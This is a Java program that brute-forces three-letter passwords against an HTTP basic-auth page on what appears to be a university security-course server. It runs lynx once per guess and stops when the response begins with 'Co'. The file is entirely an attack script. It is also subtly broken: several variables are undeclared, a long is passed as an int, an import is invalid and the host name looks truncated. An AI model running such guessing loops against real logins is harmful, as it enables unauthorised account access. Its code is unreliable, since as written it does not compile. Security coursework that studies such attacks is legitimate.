

import java.*;
import java.io.*;
import java.util.*;

public class BruteForce
{
 public final static int TOTAL_TIMES=52*52*52;
 public char[] passwd;
 public static void main(String[] args) throws IOException
 {
  BruteForce bf=new BruteForce();
  System.out.println(" cracking...");
   time1=new Date().getTime();
  bf.doBruteForce(time1);
	 time2=new Date().getTime();
	System.out.println("Finish cracking.");
	System.out.println(" password found.");
  System.out.println("costs "+(time2-time1)+" milliseconds");
  System.exit(1);
 }

 void doBruteForce(int time1) throws IOException
 {
  passwd=new char[3];
  Runtime rt=Runtime.getRuntime();
   num=0;
  for(int i=(int)'z';i>=(int)'A';i--)
  {
    if(i==96)
     i=90;
    passwd[0]=(char)i;
    for(int j=(int)'z';j>=(int)'A';j--)
    {
     if(j==96)
      j=90;
     passwd[1]=(char)j;
     for(int k=(int)'z';k>=(int)'A';k--)
     {
      if(k==96)
       k=90;
      passwd[2]=(char)k;
      String password=new String(passwd);
			try
      {
				num++;

				
				Process p=rt.exec("lynx -auth=:"+password+" -source http://sec-crack.cs.rmit.edu./SEC/2/index.php");
				
				String ln = (new BufferedReader(new InputStreamReader(p.getInputStream()))).readLine();
	      p.destroy();

				if(ln!=null)
        
        if(ln.toCharArray()[0]=='C'&&ln.toCharArray()[1]=='o')
        {

          System.out.println(password);
					System.out.println("Finish cracking.");
					System.out.println(ln);
					System.out.println("password is "+password);
           time2=new Date().getTime();
          System.out.println("costs "+(time2-time1)+" milliseconds");
          System.out.println("The number of attempts is "+num);
		      System.exit(1);
        }
        
        

      } catch (FileNotFoundException exc) {
        System.out.println ("File Not Found");
				k++;
      } catch (IOException exc) {
		    System.out.println ("IOException");
        k++;
      } catch (NullPointerException exc) {
		    System.out.println ("NullPointerException");
        k++;
	  	}

     }
    }
  }
 }
}
